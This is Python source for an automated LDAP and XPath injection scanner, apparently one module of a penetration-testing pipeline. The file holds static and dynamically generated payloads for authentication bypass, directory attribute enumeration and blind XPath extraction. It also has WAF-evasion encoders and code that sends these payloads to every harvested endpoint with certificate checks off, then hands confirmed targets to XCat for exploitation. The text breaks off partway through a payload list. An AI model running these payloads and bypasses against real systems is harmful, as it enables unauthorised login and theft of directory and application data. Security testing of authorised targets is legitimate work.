#!/usr/bin/env python3
"""
Task 49 - LDAP & XPath Injection Scanner
AI Brain for automated LDAP and XPath injection detection

Covers testing_toolkit.txt Step 14 (LDAP/XPath portions)
NoSQL handled separately by Task 45
"""

import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────

BASE_DIR = Path(__file__).resolve().parent.parent.parent
JULES_OUTPUTS = BASE_DIR / "jules" / "outputs"
JULES_TEMP = BASE_DIR / "jules" / "temp" / "agent1"

# Input files
INPUT_DYNAMIC_URLS = JULES_OUTPUTS / "queue_dynamic_endpoints_urls.txt"
INPUT_ARJUN_PARAMS = JULES_TEMP / "arjun_found_params.txt"
INPUT_API_ENDPOINTS = JULES_OUTPUTS / "api_endpoints_live.txt"
INPUT_HAR_ENDPOINTS = JULES_TEMP / "har_derived_endpoints.txt"
INPUT_LIVE_URLS = JULES_TEMP / "live_base_urls.txt"

# Intelligence files
WAF_RESULTS = JULES_OUTPUTS / "waf" / "waf_results.json"
BRAIN_KNOWLEDGE = JULES_OUTPUTS / "nuclei" / "brain_knowledge.json"

# Output directory
OUTPUT_DIR = JULES_OUTPUTS / "ldap_xpath"
OUTPUT_LDAP_FINDINGS = OUTPUT_DIR / "ldap_injection_findings.json"
OUTPUT_XPATH_FINDINGS = OUTPUT_DIR / "xpath_injection_findings.json"
OUTPUT_LDAP_CANDIDATES = OUTPUT_DIR / "ldap_candidates.txt"
OUTPUT_XPATH_CANDIDATES = OUTPUT_DIR / "xpath_candidates.txt"
OUTPUT_SCAN_LOG = OUTPUT_DIR / "scan_log.txt"
OUTPUT_CHECKPOINT = OUTPUT_DIR / "checkpoint.json"

# Timing
BATCH_SIZE = 50
MAX_BATCH_TIME = 480  # 8 minutes
REQUEST_TIMEOUT = 10
MAX_WORKERS = 5

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD DEFINITIONS
# ─────────────────────────────────────────────────────────────────────────────

# Parameters likely to be LDAP-injectable
LDAP_PARAM_NAMES = {
    'username', 'user', 'uid', 'cn', 'sn', 'mail', 'email', 'dn', 'ou', 'dc',
    'samaccountname', 'userprincipalname', 'memberof', 'objectclass', 'filter',
    'search', 'query', 'ldap', 'directory', 'ad', 'account', 'login', 'name',
    'firstname', 'lastname', 'department', 'manager', 'employee', 'staff',
    'person', 'searchuser', 'finduser', 'lookup', 'userdn', 'basedn'
}

# Parameters likely to be XPath-injectable
XPATH_PARAM_NAMES = {
    'xpath', 'xml', 'path', 'node', 'element', 'query', 'search', 'id', 'name',
    'user', 'username', 'login', 'password', 'filter', 'select', 'where',
    'value', 'attribute', 'tag', 'document', 'doc', 'expr', 'expression',
    'xmlpath', 'nodepath', 'xquery', 'selector'
}

# LDAP injection payloads
LDAP_PAYLOADS = {
    'wildcard': [
        '*',
        '*)(uid=*)',
        '*)(cn=*)',
        '*))%00',
    ],
    'auth_bypass': [
        'admin)(|(password=*',
        'admin)(&)',
        '*)(objectClass=*',
        '*)|(&)',
        '*))(|(uid=*',
    ],
    'info_disclosure': [
        '*)(|(mail=*',
        '*)(|(cn=*',
        '*)(|(sn=*',
        '*)(|(memberOf=*',
    ],
    'filter_manipulation': [
        ')(cn=*',
        ')(uid=*',
        ')(objectClass=*',
        '))(|(objectClass=*',
    ],
    'operator_abuse': [
        ')(&)(uid=*',
        ')(|(uid=*',
        ')(!(objectClass=nonexistent)',
    ]
}

# XPath injection payloads
XPATH_PAYLOADS = {
    'auth_bypass': [
        "' or '1'='1",
        "' or ''='",
        '" or "1"="1',
        '" or ""="',
        "' or 1=1 or ''='",
        "') or ('1'='1",
    ],
    'extraction': [
        "' | //* | '",
        "' | //user/* | '",
        "' or name()='",
        "'] | //* | /foo[bar='",
    ],
    'blind': [
        "' or string-length(//user)>0 and ''='",
        "' or count(//user)>0 and ''='",
        "' or substring(name(/*),1,1)='a' and ''='",
    ],
    'operators': [
        "' and '1'='1",
        "' and ''='",
        "' or not('1'='2') and ''='",
        "' or 1<2 and ''='",
    ]
}

# LDAP error signatures
LDAP_ERROR_SIGNATURES = [
    r'invalid dn syntax',
    r'ldap_search',
    r'bad search filter',
    r'error in filter',
    r'invalid filter',
    r'javax\.naming\.NamingException',
    r'com\.sun\.jndi\.ldap',
    r'LDAPException',
    r'ldap error',
    r'search filter is invalid',
    r'error:0x[0-9a-f]+',
    r'error 0x[0-9a-f]+',
    r'ldap_err2string',
    r'ldap://|ldaps://',
]

# XPath error signatures
XPATH_ERROR_SIGNATURES = [
    r'XPathException',
    r'invalid xpath',
    r'xpath syntax error',
    r'javax\.xml\.xpath',
    r'XPathEvalError',
    r'SimpleXMLElement::xpath',
    r'DOMXPath',
    r'xpath syntax error',
    r'invalid expression',
    r'xmlXPathEval',
    r'xpath\.evaluate',
    r'xpath error',
    r'XPathExpressionException',
    r'libxml.*xpath',
    r'XMLReader',
]

# ─────────────────────────────────────────────────────────────────────────────
# DATA CLASSES
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class InjectionFinding:
    """Represents a confirmed injection finding"""
    url: str
    param: str
    injection_type: str  # 'ldap' or 'xpath'
    payload: str
    evidence: str
    severity: str
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    
    def to_dict(self):
        return {
            'url': self.url,
            'param': self.param,
            'injection_type': self.injection_type,
            'payload': self.payload,
            'evidence': self.evidence,
            'severity': self.severity,
            'timestamp': self.timestamp
        }

@dataclass
class ScanTarget:
    """Represents a target to scan"""
    url: str
    params: dict
    method: str = 'GET'
    headers: dict = field(default_factory=dict)
    injection_type: str = 'unknown'  # 'ldap', 'xpath', or 'both'

# ─────────────────────────────────────────────────────────────────────────────
# TARGET CLASSIFIER
# ─────────────────────────────────────────────────────────────────────────────

class TargetClassifier:
    """Classifies targets as LDAP-likely, XPath-likely, or both"""
    
    def __init__(self, brain_knowledge: dict = None):
        self.brain_knowledge = brain_knowledge or {}
        self.tech_stack = self._extract_tech_stack()
    
    def _extract_tech_stack(self) -> set:
        """Extract technology stack from brain knowledge"""
        techs = set()
        if not self.brain_knowledge:
            return techs
        
        for host_data in self.brain_knowledge.values():
            if isinstance(host_data, dict):
                techs.update(host_data.get('technologies', []))
                techs.update(host_data.get('frameworks', []))
        
        return {t.lower() for t in techs}
    
    def classify(self, url: str, params: dict) -> str:
        """
        Classify target as ldap, xpath, or both
        Returns: 'ldap', 'xpath', 'both', or 'skip'
        """
        ldap_score = 0
        xpath_score = 0
        
        # Check URL path
        url_lower = url.lower()
        
        # LDAP indicators in URL
        if any(x in url_lower for x in ['ldap', 'directory', '/ad/', 'activedirectory', 'login', 'auth']):
            ldap_score += 2
        
        # XPath indicators in URL
        if any(x in url_lower for x in ['xml', 'xpath', 'soap', 'wsdl', 'saml']):
            xpath_score += 2
        
        # Check parameter names
        param_names = {p.lower() for p in params.keys()}
        
        ldap_matches = param_names & LDAP_PARAM_NAMES
        xpath_matches = param_names & XPATH_PARAM_NAMES
        
        ldap_score += len(ldap_matches) * 2
        xpath_score += len(xpath_matches) * 2
        
        # Tech stack hints
        if any(t in self.tech_stack for t in ['java', '.net', 'asp.net', 'spring', 'ldap']):
            ldap_score += 1
        
        if any(t in self.tech_stack for t in ['xml', 'soap', 'xslt', 'xpath']):
            xpath_score += 1
        
        # Determine classification
        if ldap_score == 0 and xpath_score == 0:
            # Default: test both if no clear indicators
            return 'both'
        elif ldap_score > 0 and xpath_score > 0:
            return 'both'
        elif ldap_score > xpath_score:
            return 'ldap'
        elif xpath_score > ldap_score:
            return 'xpath'
        else:
            return 'both'

# ─────────────────────────────────────────────────────────────────────────────
# INJECTION SCANNER
# ─────────────────────────────────────────────────────────────────────────────

class InjectionScanner:
    """Main scanner for LDAP and XPath injection"""
    
    def __init__(self):
        self.session = self._create_session()
        self.ldap_findings: list[InjectionFinding] = []
        self.xpath_findings: list[InjectionFinding] = []
        self.ldap_candidates: list[str] = []
        self.xpath_candidates: list[str] = []
        self.scan_log: list[str] = []
        self.checkpoint: dict = {}
        self.waf_info: dict = {}
        self.brain_knowledge: dict = {}
        self.classifier: TargetClassifier = None
        self.payload_generator = DynamicPayloadGenerator()  # AI brain
        
        # Ensure output directory exists
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    def _create_session(self) -> requests.Session:
        """Create HTTP session with retry logic"""
        session = requests.Session()
        retry = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def log(self, message: str):
        """Log message with timestamp"""
        timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        self.scan_log.append(log_entry)
        print(log_entry)
    
    def load_intelligence(self):
        """Load WAF and tech detection results"""
        # Load WAF results
        if WAF_RESULTS.exists():
            try:
                with open(WAF_RESULTS) as f:
                    self.waf_info = json.load(f)
                self.log(f"Loaded WAF info: {len(self.waf_info)} hosts")
            except Exception as e:
                self.log(f"Warning: Could not load WAF results: {e}")
        
        # Load brain knowledge
        if BRAIN_KNOWLEDGE.exists():
            try:
                with open(BRAIN_KNOWLEDGE) as f:
                    self.brain_knowledge = json.load(f)
                self.log(f"Loaded brain knowledge: {len(self.brain_knowledge)} hosts")
            except Exception as e:
                self.log(f"Warning: Could not load brain knowledge: {e}")
        
        # Initialize classifier
        self.classifier = TargetClassifier(self.brain_knowledge)
    
    def load_checkpoint(self) -> dict:
        """Load checkpoint for resume"""
        if OUTPUT_CHECKPOINT.exists():
            try:
                with open(OUTPUT_CHECKPOINT) as f:
                    self.checkpoint = json.load(f)
                self.log(f"Loaded checkpoint: index {self.checkpoint.get('last_target_index', 0)}")
            except Exception as e:
                self.log(f"Warning: Could not load checkpoint: {e}")
        return self.checkpoint
    
    def save_checkpoint(self, index: int):
        """Save checkpoint for resume"""
        self.checkpoint = {
            'last_target_index': index,
            'ldap_completed': len(self.ldap_findings),
            'xpath_completed': len(self.xpath_findings),
            'timestamp': datetime.utcnow().isoformat()
        }
        with open(OUTPUT_CHECKPOINT, 'w') as f:
            json.dump(self.checkpoint, f, indent=2)
    
    def load_targets(self) -> list[ScanTarget]:
        """Load and parse targets from input files"""
        targets = []
        seen_urls = set()
        
        # Load dynamic URLs (primary)
        if INPUT_DYNAMIC_URLS.exists():
            with open(INPUT_DYNAMIC_URLS) as f:
                for line in f:
                    line = line.strip()
                    if line and line not in seen_urls:
                        seen_urls.add(line)
                        parsed = urllib.parse.urlparse(line)
                        params = dict(urllib.parse.parse_qsl(parsed.query))
                        if params:
                            targets.append(ScanTarget(url=line, params=params))
        
        # Load API endpoints
        if INPUT_API_ENDPOINTS.exists():
            with open(INPUT_API_ENDPOINTS) as f:
                for line in f:
                    line = line.strip()
                    if line and line not in seen_urls:
                        seen_urls.add(line)
                        parsed = urllib.parse.urlparse(line)
                        params = dict(urllib.parse.parse_qsl(parsed.query))
                        # API endpoints might use POST
                        targets.append(ScanTarget(url=line, params=params, method='POST' if not params else 'GET'))
        
        # Load Arjun-discovered params
        if INPUT_ARJUN_PARAMS.exists():
            with open(INPUT_ARJUN_PARAMS) as f:
                for line in f:
                    line = line.strip()
                    if line and line not in seen_urls:
                        seen_urls.add(line)
                        parsed = urllib.parse.urlparse(line)
                        params = dict(urllib.parse.parse_qsl(parsed.query))
                        if params:
                            targets.append(ScanTarget(url=line, params=params))
        
        self.log(f"Loaded {len(targets)} targets for scanning")
        
        # Classify targets
        for target in targets:
            target.injection_type = self.classifier.classify(target.url, target.params)
        
        ldap_count = sum(1 for t in targets if t.injection_type in ['ldap', 'both'])
        xpath_count = sum(1 for t in targets if t.injection_type in ['xpath', 'both'])
        self.log(f"Classification: {ldap_count} LDAP-likely, {xpath_count} XPath-likely")
        
        return targets
    
    def get_baseline(self, target: ScanTarget) -> tuple[int, str, float]:
        """Get baseline response for comparison"""
        try:
            parsed = urllib.parse.urlparse(target.url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            start_time = time.time()
            
            if target.method == 'GET':
                resp = self.session.get(
                    base_url,
                    params=target.params,
                    timeout=REQUEST_TIMEOUT,
                    verify=False,
                    allow_redirects=True
                )
            else:
                resp = self.session.post(
                    base_url,
                    data=target.params,
                    timeout=REQUEST_TIMEOUT,
                    verify=False,
                    allow_redirects=True
                )
            
            elapsed = time.time() - start_time
            return resp.status_code, resp.text, elapsed
            
        except Exception as e:
            self.log(f"Baseline error for {target.url}: {e}")
            return 0, '', 0.0
    
    def test_ldap_injection(self, target: ScanTarget, baseline_len: int, baseline_time: float) -> list[InjectionFinding]:
        """Test for LDAP injection vulnerabilities"""
        findings = []
        parsed = urllib.parse.urlparse(target.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Get host-specific WAF info
        host = parsed.netloc
        waf_type = self.waf_info.get(host, {}).get('waf_type')
        
        for param_name, param_value in target.params.items():
            # Skip if param name doesn't look LDAP-injectable
            if param_name.lower() not in LDAP_PARAM_NAMES:
                continue
            
            # Record as candidate
            self.ldap_candidates.append(f"{target.url} (param: {param_name})")
            
            # Generate context-aware dynamic payloads
            context = {
                'param_name': param_name,
                'waf_type': waf_type,
                'baseline_len': baseline_len,
            }
            dynamic_payloads = self.payload_generator.generate_ldap_payloads(context)
            
            # Combine static + dynamic payloads
            all_payloads = []
            for category, payloads in LDAP_PAYLOADS.items():
                all_payloads.extend(payloads)
            all_payloads.extend(dynamic_payloads)
            all_payloads = list(set(all_payloads))  # Dedupe
            
            for payload in all_payloads:
                try:
                    # Inject payload
                    test_params = target.params.copy()
                    test_params[param_name] = payload
                    
                    if target.method == 'GET':
                        resp = self.session.get(
                            base_url,
                            params=test_params,
                            timeout=REQUEST_TIMEOUT,
                            verify=False,
                            allow_redirects=True
                        )
                    else:
                        resp = self.session.post(
                            base_url,
                            data=test_params,
                            timeout=REQUEST_TIMEOUT,
                            verify=False,
                            allow_redirects=True
                        )
                    
                    # Learn from response
                    found_error = False
                    
                    # Check for LDAP errors
                    response_lower = resp.text.lower()
                    for pattern in LDAP_ERROR_SIGNATURES:
                        if re.search(pattern, response_lower, re.IGNORECASE):
                            finding = InjectionFinding(
                                url=target.url,
                                param=param_name,
                                injection_type='ldap',
                                payload=payload,
                                evidence=f"LDAP error pattern matched: {pattern}",
                                severity='HIGH'
                            )
                            findings.append(finding)
                            self.log(f"LDAP INJECTION FOUND: {target.url} param={param_name}")
                            self.payload_generator.learn_from_response(payload, resp.text, True)
                            found_error = True
                            break
                    
                    if not found_error:
                        # Check for response length difference (possible blind)
                        len_diff = abs(len(resp.text) - baseline_len)
                        if len_diff > baseline_len * 0.5 and len_diff > 100:
                            # Significant difference - possible injection
                            finding = InjectionFinding(
                                url=target.url,
                                param=param_name,
                                injection_type='ldap',
                                payload=payload,
                                evidence=f"Response length diff: {len_diff} bytes (baseline: {baseline_len})",
                                severity='MEDIUM'
                            )
                            findings.append(finding)
                            self.log(f"LDAP INJECTION (blind): {target.url} param={param_name}")
                            self.payload_generator.learn_from_response(payload, resp.text, True)
                        else:
                            self.payload_generator.learn_from_response(payload, resp.text, False)
                    
                except Exception as e:
                    continue
        
        return findings
    
    def test_xpath_injection(self, target: ScanTarget, baseline_len: int, baseline_time: float) -> list[InjectionFinding]:
        """Test for XPath injection vulnerabilities"""
        findings = []
        parsed = urllib.parse.urlparse(target.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Get host-specific WAF info
        host = parsed.netloc
        waf_type = self.waf_info.get(host, {}).get('waf_type')
        
        for param_name, param_value in target.params.items():
            # Skip if param name doesn't look XPath-injectable
            # (but still test common params like 'username', 'id')
            param_lower = param_name.lower()
            if param_lower not in XPATH_PARAM_NAMES and param_lower not in {'id', 'user', 'username', 'name', 'search', 'query'}:
                continue
            
            # Record as candidate
            self.xpath_candidates.append(f"{target.url} (param: {param_name})")
            
            # Generate context-aware dynamic payloads
            context = {
                'param_name': param_name,
                'waf_type': waf_type,
                'baseline_len': baseline_len,
            }
            dynamic_payloads = self.payload_generator.generate_xpath_payloads(context)
            
            # Combine static + dynamic payloads
            all_payloads = []
            for category, payloads in XPATH_PAYLOADS.items():
                all_payloads.extend(payloads)
            all_payloads.extend(dynamic_payloads)
            all_payloads = list(set(all_payloads))  # Dedupe
            
            for payload in all_payloads:
                try:
                    # Inject payload
                    test_params = target.params.copy()
                    test_params[param_name] = payload
                    
                    if target.method == 'GET':
                        resp = self.session.get(
                            base_url,
                            params=test_params,
                            timeout=REQUEST_TIMEOUT,
                            verify=False,
                            allow_redirects=True
                        )
                    else:
                        resp = self.session.post(
                            base_url,
                            data=test_params,
                            timeout=REQUEST_TIMEOUT,
                            verify=False,
                            allow_redirects=True
                        )
                    
                    # Learn from response
                    found_error = False
                    
                    # Check for XPath errors
                    response_text = resp.text
                    for pattern in XPATH_ERROR_SIGNATURES:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            finding = InjectionFinding(
                                url=target.url,
                                param=param_name,
                                injection_type='xpath',
                                payload=payload,
                                evidence=f"XPath error pattern matched: {pattern}",
                                severity='HIGH'
                            )
                            findings.append(finding)
                            self.log(f"XPATH INJECTION FOUND: {target.url} param={param_name}")
                            self.payload_generator.learn_from_response(payload, resp.text, True)
                            found_error = True
                            break
                    
                    if not found_error:
                        # Check for response length difference (possible blind)
                        len_diff = abs(len(resp.text) - baseline_len)
                        if len_diff > baseline_len * 0.5 and len_diff > 100:
                            # Significant difference - possible injection
                            finding = InjectionFinding(
                                url=target.url,
                                param=param_name,
                                injection_type='xpath',
                                payload=payload,
                                evidence=f"Response length diff: {len_diff} bytes (baseline: {baseline_len})",
                                severity='MEDIUM'
                            )
                            findings.append(finding)
                            self.log(f"XPATH INJECTION (blind): {target.url} param={param_name}")
                            self.payload_generator.learn_from_response(payload, resp.text, True)
                        
                        # Check for auth bypass (more data returned)
                        elif 'auth_bypass' in str(XPATH_PAYLOADS.keys()) and len(resp.text) > baseline_len * 1.5:
                            finding = InjectionFinding(
                                url=target.url,
                                param=param_name,
                                injection_type='xpath',
                                payload=payload,
                                evidence=f"Auth bypass - extra data returned ({len(resp.text)} vs {baseline_len} bytes)",
                                severity='CRITICAL'
                            )
                            findings.append(finding)
                            self.log(f"XPATH AUTH BYPASS: {target.url} param={param_name}")
                            self.payload_generator.learn_from_response(payload, resp.text, True)
                        else:
                            self.payload_generator.learn_from_response(payload, resp.text, False)
                    
                except Exception as e:
                    continue
        
        return findings
    
    def run_xcat(self, url: str, param: str):
        """Run XCat tool for XPath injection exploitation"""
        try:
            # Check if xcat is available
            result = subprocess.run(
                ['xcat', '--help'],
                capture_output=True,
                timeout=5
            )
            
            if result.returncode != 0:
                self.log("XCat not available, skipping automated exploitation")
                return
            
            # Run XCat detection
            inject_url = url.replace(f"{param}=", f"{param}=INJECT")
            cmd = [
                'xcat', 'detect',
                f'--url={inject_url}'
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if 'vulnerable' in result.stdout.lower():
                self.log(f"XCat confirmed XPath injection at {url}")
            
        except FileNotFoundError:
            self.log("XCat not installed")
        except subprocess.TimeoutExpired:
            self.log("XCat timeout")
        except Exception as e:
            self.log(f"XCat error: {e}")
    
    def scan_target(self, target: ScanTarget) -> tuple[list[InjectionFinding], list[InjectionFinding]]:
        """Scan a single target for both LDAP and XPath injection"""
        ldap_findings = []
        xpath_findings = []
        
        # Get baseline
        status, baseline_text, baseline_time = self.get_baseline(target)
        if status == 0:
            return ldap_findings, xpath_findings
        
        baseline_len = len(baseline_text)
        
        # Test based on classification
        if target.injection_type in ['ldap', 'both']:
            ldap_findings = self.test_ldap_injection(target, baseline_len, baseline_time)
        
        if target.injection_type in ['xpath', 'both']:
            xpath_findings = self.test_xpath_injection(target, baseline_len, baseline_time)
        
        return ldap_findings, xpath_findings
    
    def scan_all(self, targets: list[ScanTarget], start_index: int = 0):
        """Scan all targets with batching"""
        total = len(targets)
        batch_start = time.time()
        
        for i, target in enumerate(targets[start_index:], start=start_index):
            # Check batch timeout
            if time.time() - batch_start > MAX_BATCH_TIME:
                self.log(f"Batch timeout at index {i}")
                self.save_checkpoint(i)
                self.save_outputs()
                batch_start = time.time()
            
            # Checkpoint every batch
            if (i - start_index) > 0 and (i - start_index) % BATCH_SIZE == 0:
                self.log(f"Checkpoint at {i}/{total}")
                self.save_checkpoint(i)
                self.save_outputs()
            
            self.log(f"Scanning [{i+1}/{total}]: {target.url[:80]}...")
            
            try:
                ldap_f, xpath_f = self.scan_target(target)
                self.ldap_findings.extend(ldap_f)
                self.xpath_findings.extend(xpath_f)
            except Exception as e:
                self.log(f"Error scanning {target.url}: {e}")
        
        self.log(f"Scan complete: {len(self.ldap_findings)} LDAP, {len(self.xpath_findings)} XPath findings")
    
    def save_outputs(self):
        """Save all outputs"""
        # LDAP findings
        with open(OUTPUT_LDAP_FINDINGS, 'w') as f:
            json.dump([f.to_dict() for f in self.ldap_findings], f, indent=2)
        
        # XPath findings
        with open(OUTPUT_XPATH_FINDINGS, 'w') as f:
            json.dump([f.to_dict() for f in self.xpath_findings], f, indent=2)
        
        # LDAP candidates (dedupe)
        with open(OUTPUT_LDAP_CANDIDATES, 'w') as f:
            f.write('\n'.join(sorted(set(self.ldap_candidates))))
        
        # XPath candidates (dedupe)
        with open(OUTPUT_XPATH_CANDIDATES, 'w') as f:
            f.write('\n'.join(sorted(set(self.xpath_candidates))))
        
        # Scan log
        with open(OUTPUT_SCAN_LOG, 'w') as f:
            f.write('\n'.join(self.scan_log))
        
        self.log(f"Outputs saved to {OUTPUT_DIR}")
    
    def run(self):
        """Main execution"""
        self.log("=" * 60)
        self.log("Task 49 - LDAP & XPath Injection Scanner")
        self.log("=" * 60)
        
        # Load intelligence
        self.load_intelligence()
        
        # Load checkpoint
        checkpoint = self.load_checkpoint()
        start_index = checkpoint.get('last_target_index', 0)
        
        # Load targets
        targets = self.load_targets()
        
        if not targets:
            self.log("No targets found!")
            return
        
        # Run scan
        self.scan_all(targets, start_index)
        
        # Final save
        self.save_outputs()
        
        # Summary
        self.log("=" * 60)
        self.log("SCAN SUMMARY")
        self.log("=" * 60)
        self.log(f"Total targets scanned: {len(targets)}")
        self.log(f"LDAP injection findings: {len(self.ldap_findings)}")
        self.log(f"XPath injection findings: {len(self.xpath_findings)}")
        self.log(f"LDAP candidates for manual testing: {len(set(self.ldap_candidates))}")
        self.log(f"XPath candidates for manual testing: {len(set(self.xpath_candidates))}")
        
        # Print high severity findings
        critical_findings = [f for f in self.ldap_findings + self.xpath_findings if f.severity in ['CRITICAL', 'HIGH']]
        if critical_findings:
            self.log("-" * 60)
            self.log("CRITICAL/HIGH FINDINGS:")
            for f in critical_findings:
                self.log(f"  [{f.severity}] {f.injection_type.upper()}: {f.url}")
                self.log(f"           Param: {f.param}, Payload: {f.payload[:50]}")

# ─────────────────────────────────────────────────────────────────────────────
# WAF BYPASS HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def encode_payload(payload: str, encoding: str = 'url') -> str:
    """Encode payload to bypass WAF"""
    if encoding == 'url':
        return urllib.parse.quote(payload)
    elif encoding == 'double_url':
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == 'unicode':
        return ''.join(f'\\u{ord(c):04x}' if c in "'\"\\" else c for c in payload)
    elif encoding == 'html':
        return ''.join(f'&#x{ord(c):x};' if c in "'\"\\" else c for c in payload)
    return payload

def generate_bypass_variants(payload: str) -> list[str]:
    """Generate multiple bypass variants of a payload"""
    variants = [payload]
    
    # URL encoding
    variants.append(encode_payload(payload, 'url'))
    
    # Double URL encoding
    variants.append(encode_payload(payload, 'double_url'))
    
    # Case variations (for keywords)
    if ' or ' in payload.lower():
        variants.append(payload.replace(' or ', ' OR '))
        variants.append(payload.replace(' or ', ' Or '))
        variants.append(payload.replace(' or ', ' oR '))
    
    # Whitespace variations
    variants.append(payload.replace(' ', '\t'))
    variants.append(payload.replace(' ', '/**/'))
    
    return list(set(variants))

# ─────────────────────────────────────────────────────────────────────────────
# DYNAMIC PAYLOAD GENERATOR (AI BRAIN)
# ─────────────────────────────────────────────────────────────────────────────

class DynamicPayloadGenerator:
    """
    AI-driven dynamic payload generation for LDAP and XPath injection.
    Adapts payloads based on observed responses and context.
    """
    
    # Character sets for blind extraction
    CHARSET_ALPHA = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    CHARSET_NUMERIC = '0123456789'
    CHARSET_SPECIAL = '!@#$%^&*()-_=+[]{}|;:,.<>?/'
    CHARSET_COMMON = 'etaoinshrdlcumwfgypbvkjxqz'  # By frequency
    
    def __init__(self):
        self.learned_patterns = {}
        self.successful_payloads = []
        self.blocked_patterns = []
    
    # ─────────────────────────────────────────────────────────────────────
    # LDAP DYNAMIC PAYLOADS
    # ─────────────────────────────────────────────────────────────────────
    
    def generate_ldap_payloads(self, context: dict = None) -> list[str]:
        """
        Generate dynamic LDAP payloads based on context.
        
        Context can include:
        - param_name: The parameter being tested
        - baseline_response: Normal response content
        - error_patterns: Any error messages seen
        - waf_type: Detected WAF
        """
        context = context or {}
        payloads = []
        
        # Base payloads
        base_payloads = [
            '*',
            '*)',
            '*)(uid=*)',
            '*)(&',
            '*)(|',
            'admin)(&)',
            '*)(objectClass=*)',
        ]
        payloads.extend(base_payloads)
        
        # Context-aware: If param looks like username
        param_name = context.get('param_name', '').lower()
        if param_name in ['username', 'user', 'uid', 'login', 'account']:
            payloads.extend([
                'admin)(|(password=*',
                '*)(uid=admin)',
                'admin*',
                '*admin*',
                'admin)(cn=*',
            ])
        
        # Context-aware: If param looks like search/filter
        if param_name in ['search', 'query', 'filter', 'q']:
            payloads.extend([
                '*)(|(cn=*',
                '*)(|(mail=*',
                '*))(|(objectClass=*',
                '(&(cn=*)',
            ])
        
        # If we've seen LDAP errors, try more aggressive payloads
        if context.get('error_patterns'):
            payloads.extend(self._generate_ldap_error_based_payloads())
        
        # WAF bypass variants
        if context.get('waf_type'):
            payloads.extend(self._generate_ldap_waf_bypass(base_payloads, context['waf_type']))
        
        # Generate attribute enumeration payloads
        payloads.extend(self._generate_ldap_attribute_enum())
        
        return list(set(payloads))
    
    def _generate_ldap_error_based_payloads(self) -> list[str]:
        """Generate payloads to extract info via error messages"""
        return [
            '*)(((',                          # Malformed - may leak filter structure
            '*)(uid=',                         # Incomplete - may show expected format
            '*)(nonexistent=',                 # Invalid attr - may list valid attrs
            '\\00',                            # Null byte
            '\\2a\\29\\28',                    # Encoded *)(
            '*)(%26)',                         # URL-encoded &
            '*)(\x00)',                        # Literal null
        ]
    
    def _generate_ldap_waf_bypass(self, base_payloads: list, waf_type: str) -> list[str]:
        """Generate WAF-specific bypass payloads"""
        bypasses = []
        
        for payload in base_payloads[:5]:  # Top 5 payloads
            # URL encoding
            bypasses.append(urllib.parse.quote(payload))
            
            # Double URL encoding
            bypasses.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # Mixed case for any alpha chars
            if any(c.isalpha() for c in payload):
                mixed = ''.join(
                    c.upper() if i % 2 == 0 else c.lower() 
                    for i, c in enumerate(payload)
                )
                bypasses.append(mixed)
            
            # Unicode escapes
            bypasses.append(payload.replace('*', '\\2a').replace('(', '\\28').replace(')', '\\29'))
            
            # Chunked/split
            if len(payload) > 3:
                mid = len(payload) // 2
                bypasses.append(payload[:mid] + '%00' + payload[mid:])
        
        return bypasses
    
    def _generate_ldap_attribute_enum(self) -> list[str]:
        """Generate payloads to enumerate LDAP attributes"""
        common_attrs = [
            'uid', 'cn', 'sn', 'mail', 'userPassword', 'telephoneNumber',
            'description', 'memberOf', 'objectClass', 'dn', 'ou',
            'givenName', 'displayName', 'sAMAccountName', 'userPrincipalName'
        ]
        
        payloads = []
        for attr in common_attrs:
            payloads.append(f'*)({attr}=*')
            payloads.append(f'*)(|({attr}=*')
        
        return payloads
    
    # ─────────────────────────────────────────────────────────────────────
    # XPATH DYNAMIC PAYLOADS
    # ─────────────────────────────────────────────────────────────────────
    
    def generate_xpath_payloads(self, context: dict = None) -> list[str]:
        """
        Generate dynamic XPath payloads based on context.
        """
        context = context or {}
        payloads = []
        
        # Base auth bypass payloads
        base_payloads = [
            "' or '1'='1",
            "' or ''='",
            '" or "1"="1',
            "' or 1=1 or ''='",
            "') or ('1'='1",
            "' or true() or ''='",
        ]
        payloads.extend(base_payloads)
        
        # Context-aware: Based on parameter name
        param_name = context.get('param_name', '').lower()
        
        if param_name in ['username', 'user', 'login']:
            payloads.extend([
                "admin' or '1'='1",
                "admin'--",
                "admin' and '1'='1",
                "' or name()='user' or ''='",
            ])
        
        if param_name in ['id', 'userid', 'uid']:
            payloads.extend([
                "1 or 1=1",
                "1' or '1'='1",
                "1] | //* | /a[''='",
            ])
        
        if param_name in ['search', 'query', 'q', 'xpath']:
            payloads.extend([
                "' | //* | '",
                "' | //user/* | '",
                "'] | //* | //a['",
                "//*",
            ])
        
        # If we detected XML in response, try extraction payloads
        if context.get('xml_detected'):
            payloads.extend(self._generate_xpath_extraction_payloads())
        
        # WAF bypass variants
        if context.get('waf_type'):
            payloads.extend(self._generate_xpath_waf_bypass(base_payloads))
        
        # Add operator variations
        payloads.extend(self._generate_xpath_operator_variations())
        
        return list(set(payloads))
    
    def _generate_xpath_extraction_payloads(self) -> list[str]:
        """Generate payloads to extract data via XPath"""
        return [
            "' | /* | '",                           # Root element
